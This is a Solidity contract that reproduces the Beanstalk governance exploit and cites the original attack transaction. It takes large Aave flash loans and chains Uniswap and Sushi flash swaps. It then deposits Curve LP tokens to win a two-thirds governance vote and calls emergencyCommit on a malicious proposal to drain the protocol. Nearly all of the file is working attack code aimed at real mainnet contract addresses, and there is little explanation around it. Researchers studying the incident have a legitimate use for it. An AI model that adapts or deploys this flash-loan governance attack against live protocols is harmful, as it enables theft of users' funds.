// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/BeanstalkInterfaces.sol";

// Exploit tx hash: 0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7
contract BeanstalkExploiter {
    IBeanstalk private constant BEANSTALK_PROTOCOL = IBeanstalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IRouter private constant UNISWAPV2 = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IAave private constant AAVE = IAave(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IERC20Like private constant BEAN = IERC20Like(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20Like private constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant LUSD = IERC20Like(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20Like private constant _3CRV = IERC20Like(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);

    ICurvePool private constant _3POOL_ZAP = ICurvePool(0xA79828DF1850E8a3A3064576f380D90aECDD3359);
    ICurvePool private constant _3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool private constant LUSD3CRV = ICurvePool(0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA);
    ICurvePool private constant BEAN3CRV = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    ICurvePool private constant BEANLUSD = ICurvePool(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    IPair private constant ETH_BEAN_PAIR = IPair(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    IPair private constant LUSD_OHM_PAIR = IPair(0x46E4D8A1322B9448905225E52F914094dBd6dDdF);

    IUniswapPool private constant DAI_USDC_POOL = IUniswapPool(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    IUniswapPool private constant USDC_POOL = IUniswapPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IUniswapPool private constant USDT_POOL = IUniswapPool(0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36);

    address private constant UKRAINE_DONATION = 0x165CD37b4C644C2921454429E7F9358d18A45e14;

    uint256 private constant INITIAL_DAI_AMOUNT = 350_000_000e18;
    uint256 private constant INITIAL_USDC_AMOUNT = 500_000_000e6; 
    uint256 private constant INITIAL_USDT_AMOUNT = 150_000_000e6; 

    uint160 private constant MIN_SQRT_RATIO = 4_295_128_740;
    uint160 private constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;

    constructor() {
        BEAN.approve(address(_3POOL_ZAP), type(uint256).max);
        USDC.approve(address(_3POOL_ZAP), type(uint256).max);
        DAI.approve(address(_3POOL_ZAP), type(uint256).max);
        USDT.approve(address(_3POOL_ZAP), type(uint256).max);

        USDC.approve(address(_3POOL), type(uint256).max);
        DAI.approve(address(_3POOL), type(uint256).max);
        USDT.approve(address(_3POOL), type(uint256).max);

        _3CRV.approve(address(LUSD3CRV), type(uint256).max);
        LUSD.approve(address(LUSD3CRV), type(uint256).max);

        BEAN.approve(address(BEAN3CRV), type(uint256).max);
        _3CRV.approve(address(BEAN3CRV), type(uint256).max);

        BEAN.approve(address(BEANLUSD), type(uint256).max);
        LUSD.approve(address(BEANLUSD), type(uint256).max);

        BEAN.approve(address(BEANSTALK_PROTOCOL), type(uint256).max);
        USDC.approve(address(BEANSTALK_PROTOCOL), type(uint256).max);
        BEAN3CRV.approve(address(BEANSTALK_PROTOCOL), type(uint256).max);
        BEANLUSD.approve(address(BEANSTALK_PROTOCOL), type(uint256).max);

        USDC.approve(address(AAVE), type(uint256).max);
        USDT.approve(address(AAVE), type(uint256).max);
        DAI.approve(address(AAVE), type(uint256).max);
    }

    function exploit() external {
        address receiverAddress = address(this);

        address[] memory assets = new address[](3);
        assets[0] = address(DAI);
        assets[1] = address(USDC);
        assets[2] = address(USDT);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = INITIAL_DAI_AMOUNT;
        amounts[1] = INITIAL_USDC_AMOUNT;
        amounts[2] = INITIAL_USDT_AMOUNT;

        uint256[] memory modes = new uint256[](3);

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;

        AAVE.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
        // Returned from flash loan

        // Withdraw ETH and BEAN (BEAN ignored by attacker)
        ETH_BEAN_PAIR.transfer(address(ETH_BEAN_PAIR), ETH_BEAN_PAIR.balanceOf(address(this)));
        ETH_BEAN_PAIR.burn(address(this));

        // Donate to UKRAINE
        USDC.transfer(UKRAINE_DONATION, 250_000 * (10**6));

        // Swap everything to ETH
        bytes memory data = abi.encode(DAI_USDC_POOL.token0());
        DAI_USDC_POOL.swap(address(this), true, int256(DAI.balanceOf(address(this))), MIN_SQRT_RATIO, data);

        data = abi.encode(USDC_POOL.token0());
        USDC_POOL.swap(address(this), true, int256(USDC.balanceOf(address(this))), MIN_SQRT_RATIO, data);

        data = abi.encode(USDT_POOL.token0());
        USDT_POOL.swap(address(this), false, int256(USDT.balanceOf(address(this))), MAX_SQRT_RATIO, data);

        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    )
        external
        returns (bool)
    {
        // Flashswap BEAN
        uint256 balance = BEAN.balanceOf(address(ETH_BEAN_PAIR));
        bytes memory data = abi.encode(address(BEAN));
        ETH_BEAN_PAIR.swap(0, (balance * 99) / 100, address(this), data);

        // Returned from uniswapv2 callback
        // Use LUSD to mint 3CRV 
        LUSD3CRV.exchange(0, 1, LUSD.balanceOf(address(this)), 0);

        // Withdraw DAI, USDC, USDT gains
        balance = _3CRV.balanceOf(address(this));
        _3POOL.remove_liquidity_one_coin((balance * 7) / 20, 0, 0);
        _3POOL.remove_liquidity_one_coin(balance / 2, 1, 0);
        _3POOL.remove_liquidity_one_coin((balance * 3) / 20, 2, 0);
        assert(DAI.balanceOf(address(this)) > INITIAL_DAI_AMOUNT);
        assert(USDC.balanceOf(address(this)) > INITIAL_USDC_AMOUNT);
        assert(USDT.balanceOf(address(this)) > INITIAL_USDT_AMOUNT);

        return true;
    }

    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata data) external {
        address token = abi.decode(data, (address));

        // 1st swap callback
        if (token == address(BEAN)) {
            // Flashswap again, this time for LUSD
            uint256 balance = LUSD.balanceOf(address(LUSD_OHM_PAIR));
            bytes memory data1 = abi.encode(address(LUSD));
            LUSD_OHM_PAIR.swap((balance * 99) / 100, 0, address(this), data1);

            // Repay 1st flash swap
            uint256 uniFee = ((amount1 * 3) / 997) + 1;
            BEAN.transfer(address(ETH_BEAN_PAIR), amount1 + uniFee);
        }
        // 2nd swap callback
        else if (token == address(LUSD)) {
            // Mint 3Crv
            uint256[3] memory liquidity0 = [INITIAL_DAI_AMOUNT, INITIAL_USDC_AMOUNT, INITIAL_USDT_AMOUNT];
            _3POOL.add_liquidity(liquidity0, 0);

            // Use 15m 3Crv to mint some more LUSD
            LUSD3CRV.exchange(1, 0, 15_000_000e18, 0);

            // Use rest of 3Crv to mint BEAN3CRV.
            uint256[2] memory liquidity1 = [0, _3CRV.balanceOf(address(this))];
            BEAN3CRV.add_liquidity(liquidity1, 0);

            // Use all of BEAN and LUSD to mint BEANLUSD
            uint256[2] memory liquidity2 = [BEAN.balanceOf(address(this)), LUSD.balanceOf(address(this))];
            BEANLUSD.add_liquidity(liquidity2, 0);

            // Deposit into protocol to get enough votes for super majority (2/3) to perform emergencyCommit of 
            // malicious proposal and drain tokens
            BEANSTALK_PROTOCOL.deposit(address(BEAN3CRV), BEAN3CRV.balanceOf(address(this)));
            BEANSTALK_PROTOCOL.deposit(address(BEANLUSD), BEANLUSD.balanceOf(address(this)));

            BEANSTALK_PROTOCOL.vote(18);
            BEANSTALK_PROTOCOL.emergencyCommit(18);

            // Withdraw back 3Crv and LUSD + gains
            BEAN3CRV.remove_liquidity_one_coin(BEAN3CRV.balanceOf(address(this)), 1, 0);
            BEANLUSD.remove_liquidity_one_coin(BEANLUSD.balanceOf(address(this)), 1, 0);

            // Repay 2nd flash swap
            uint256 sushiFee = ((amount0 * 3) / 997) + 1;
            LUSD.transfer(address(LUSD_OHM_PAIR), amount0 + sushiFee);
        }

    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {

        address token = abi.decode(data, (address));
        if (token == address(DAI)) {
            DAI.transfer(address(DAI_USDC_POOL), uint256(amount0Delta));
        } else if (token == address(USDC)) {
            USDC.transfer(address(USDC_POOL), uint256(amount0Delta));
        } else {
            USDT.transfer(address(USDT_POOL), uint256(amount1Delta));
        }

    }

    receive() external payable{}
}
